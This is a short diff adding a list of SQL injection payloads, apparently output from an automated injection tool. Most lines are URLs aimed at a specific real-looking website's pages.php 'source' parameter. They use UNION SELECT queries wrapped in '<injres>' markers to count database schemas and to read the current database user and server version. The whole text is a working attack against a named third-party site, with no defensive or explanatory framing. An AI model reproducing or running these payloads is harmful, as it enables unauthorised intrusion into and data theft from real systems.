@@ -1,0 +1,11 @@
+concat('<injres>',(SELECT count(*) FROM (SELECT distinct table_schema FROM information_schema.TABLES) cq),'</injres>'),1,2,3,4,5,6,7
+
+http://pro-kharkov.info/pages.php?id=117&source=0%20union%20select%20concat('<injres>',(SELECT%20count(*)%20FROM%20(SELECT%20distinct%20table_schema%20FROM%20information_schema.TABLES)%20cq),'</injres>'),1,2,3,4,5,6,7%20--
+
+http://pro-kharkov.info/pages.php?id=117&source=0%20union%20select%20concat('<injres>',(SELECT CURRENT_USER()),'</injres>'),1,2,3,4,5,6,7%20--
+
+http://pro-kharkov.info/pages.php?id=117&source=0%20union%20select%20concat('<injres>',(SELECT @@version),'</injres>'),1,2,3,4,5,6,7%20--
+
+http://pro-kharkov.info/pages.php?id=117&source=0%20union%20select%20concat('<injres>',(SELECT%20count(*)%20FROM%20(SELECT%20@@version)%20cq),'</injres>'),1,2,3,4,5,6,7%20--
+
+http://pro-kharkov.info/pages.php?id=117&source=0%20union%20select%200,1,2,3,CONCAT('<injres>4|||',(SELECT%20@@version),'</injres>'),5,6,7%20--
